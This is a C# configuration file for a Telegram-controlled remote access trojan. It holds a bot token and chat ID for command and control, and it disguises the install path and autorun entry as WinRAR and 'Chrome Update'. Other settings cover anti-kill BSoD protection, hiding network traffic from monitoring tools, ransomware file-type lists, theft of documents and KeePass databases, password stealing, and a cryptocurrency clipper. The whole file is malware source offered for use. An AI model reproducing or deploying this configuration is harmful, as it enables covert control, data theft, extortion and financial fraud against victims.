﻿/* 
       * Programmer   : Y9
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "1689566724:AAFR-QUv9OSkp3qgPWw5LKXmUicv8wEaZ-A";
        public const string TelegramChatID = "1540307428";
        public static int TelegramCommandCheckDelay = 1;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Program Files\WinRAR\Uninstall.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = true;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = false;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        // Types of files to encrypt
        public static string[] EncryptionFileTypes =
        {
            ".lnk", 
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = 6291456;
        // What types of files will be downloaded from the computer when executing the /GrabDesktopFiles command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = false;
        // crypto clipper
        public static bool ClipperEnabled = true;
        // Your wallets
        public static string bitcoin_address = "btc";
        public static string etherium_address = "eth";
        public static string monero_address = "monero";
    }
}
